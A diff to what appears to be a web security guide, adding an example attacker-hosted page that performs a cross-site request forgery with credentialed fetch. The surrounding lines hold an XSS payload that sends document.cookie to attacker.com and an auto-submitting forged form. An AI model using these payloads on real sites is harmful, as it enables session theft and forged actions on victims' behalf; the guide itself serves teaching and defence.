@@ -164,7 +164,25 @@ How to prevent:
 ```html
 document.write('<img src="http://attacker.com:8080/cookie?' + document.cookie + '"/>');
 <form action="..."><input type="hidden"/>...</form><script>document.forms[0].submit();</script>
+```
 
+```html
+<!-- Attacker hosted html file -->
+<script>
+  const title='title';
+  const content='content';
+  fetch('http://target-site/path/to/back', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({
+      'param1': 'value1',
+      'param2': 'value2',...
+    })
+  }).finally(_ => {
+    location = 'http://target-site/path-to-front';
+  });
+</script>
+</script>
 ```
 
 ### Server-Side Request Forgery (SSRF)
